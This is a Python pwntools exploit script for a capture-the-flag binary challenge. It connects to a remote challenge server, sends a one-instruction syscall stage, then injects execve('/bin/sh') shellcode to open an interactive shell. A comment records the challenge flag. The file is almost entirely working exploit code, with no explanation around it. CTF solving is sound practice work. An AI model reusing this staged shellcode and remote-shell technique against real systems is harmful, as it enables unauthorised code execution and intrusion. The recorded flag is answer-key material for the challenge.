#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge") 
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.35.so")

context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)

# p = process(exe.path)
p = remote("152.69.210.130", 3002)

sl  = p.sendline
sa  = p.sendafter
sla = p.sendlineafter
rl  = p.recvline
ru  = p.recvuntil

payload1 = asm("""
    syscall 
""")
sa(b">\n", payload1)

payload2 = asm("""
    nop
    nop
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp 
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
""")
p.send(payload2)

p.interactive() 
# ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda}